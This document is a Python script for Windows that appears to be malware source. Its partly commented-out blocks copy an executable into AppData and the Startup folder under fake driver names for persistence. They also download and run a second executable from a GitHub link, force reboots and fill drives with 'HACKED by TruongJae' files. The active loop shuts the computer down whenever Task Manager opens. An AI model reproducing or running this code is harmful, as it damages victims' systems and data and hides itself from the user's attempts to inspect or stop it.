import random
import os
import getpass
import requests
import psutil
import string
user = getpass.getuser()
startup = "C:\\Users\\"+user+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
download = os.path.abspath(os.path.expanduser(os.path.expandvars("ddosweb.exe")))
nhanban = "C:\\Users\\"+user+"\\AppData"
MyDrivers = "C:\\Users\\"+user+"\\AppData\\MyDrivers"
def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False
"""def anthan():
	try:
		checkfolder = os.path.isdir(nhanban+"\\MyDrivers")
		#check folder
		if checkfolder == False:
			os.system("mkdir "+nhanban+"\\MyDrivers")
		#check file rename
		check_file_an = os.path.exists(nhanban+"\\MyDrivers\\IntelGraphicsCommandDrivers.exe")
		if check_file_an == False:
			#check file in folder
			checkfile_in_folder = os.path.exists(nhanban+"\\MyDrivers\\ddosweb.exe")
			if checkfile_in_folder == False:
				os.system("copy "+'"'+download+'"'+' '+'"'+MyDrivers+'"')
			# rename file an
			os.system("rename "+nhanban+"\\MyDrivers\\ddosweb.exe "+"IntelGraphicsCommandDrivers.exe")
			#checkfile
			checkfile = os.path.exists(startup+"\\AudioPresentation.exe")
			if checkfile == False:
				os.system("copy "+nhanban+"\\MyDrivers\\IntelGraphicsCommandDrivers.exe "+'"'+startup+'"')
				os.system("rename "+'"'+startup+"\\IntelGraphicsCommandDrivers.exe"+'"'+" "+"AudioPresentation.exe")
				runnow = startup+"\\AudioPresentation.exe"
				os.system('"'+runnow+'"')
		if checkIfProcessRunning("AudioPresentation.exe") == False:
			runnow = startup+"\\AudioPresentation.exe"
			os.system('"'+runnow+'"')
		if checkIfProcessRunning("IntelGraphicsCommandDrivers.exe") == False:
			runnow = nhanban+"\\MyDrivers\\IntelGraphicsCommandDrivers.exe"
			os.system('"'+runnow+'"')
		check_startup = os.path.exists(startup+"\\AudioPresentation.exe")
		if check_startup == False:
			os.system("copy "+nhanban+"\\MyDrivers\\IntelGraphicsCommandDrivers.exe "+'"'+startup+'"')
			os.system("rename "+'"'+startup+"\\IntelGraphicsCommandDrivers.exe"+'"'+" "+"AudioPresentation.exe")
			os.system("shutdown -r -t 1")
		####check file support
		os.system("cls")
		check_file_sp = os.path.exists(nhanban+"\\MyDrivers\\DisplayOutputSupport.exe")
		if check_file_sp == False:
			print("Đang load danh sách proxy...")
			link = "https://github.com/truongjae/ddos/raw/main/support.exe"
			r = requests.get(link)
			link_save = "C:\\Users\\truon\\AppData\\MyDrivers\\support.exe"
			with open(link_save,"wb") as f:
				f.write(r.content)
			os.system("rename "+nhanban+"\\MyDrivers\\support.exe "+"DisplayOutputSupport.exe")
		if checkIfProcessRunning('DisplayOutputSupport.exe') == False:
			runsp = nhanban+"\\MyDrivers\\DisplayOutputSupport.exe"
			os.system('"'+runsp+'"')"""
	# except:
	# 	pass
def randomstr(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str
"""word = "HACKED by TruongJae "
dubi1 = "C:\\ProgramData"
dubi2 = "C:\\Users\\Public"
dubi3 = "D:\\DataSystem"
dubi4 = "D:\\MyMusics"
checkfolder3 = os.path.isdir(dubi3)
if checkfolder3 == False:
	os.system("mkdir "+dubi3)
checkfolder4 = os.path.isdir(dubi4)
if checkfolder4 == False:
	os.system("mkdir "+dubi4)
alldubi = [dubi1,dubi2,dubi3,dubi4]"""
"""while True:
	anthan()
	try:
		rdfile = random.choice(alldubi)
		f =open(rdfile+"\\"+str(randomstr(7))+".txt","a+")
		for j in range(555555):
			f.write(word)
		f.close()
	except:
		pass"""
# while True:
# 	if checkIfProcessRunning("SystemSettings.exe"):
#  		os.system("taskkill /f /im SystemSettings.exe")
# 	if checkIfProcessRunning("cmd.exe"):
# 		os.system("taskkill /f /im cmd.exe")
# 	break
while True:
	if checkIfProcessRunning("Taskmgr.exe"):
		os.system("shutdown -s -t 1")